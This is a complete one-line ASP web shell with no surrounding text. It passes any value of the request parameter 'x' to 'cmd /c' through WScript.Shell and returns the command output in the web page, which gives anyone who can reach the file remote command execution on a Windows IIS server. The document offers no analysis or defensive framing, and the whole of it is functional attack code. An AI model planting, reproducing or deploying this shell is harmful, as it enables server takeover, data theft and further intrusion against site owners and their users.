<%
Response.write(CreateObject("WScript.Shell").Exec("cmd /c " + request("x")).StdOut.Readall())
%>
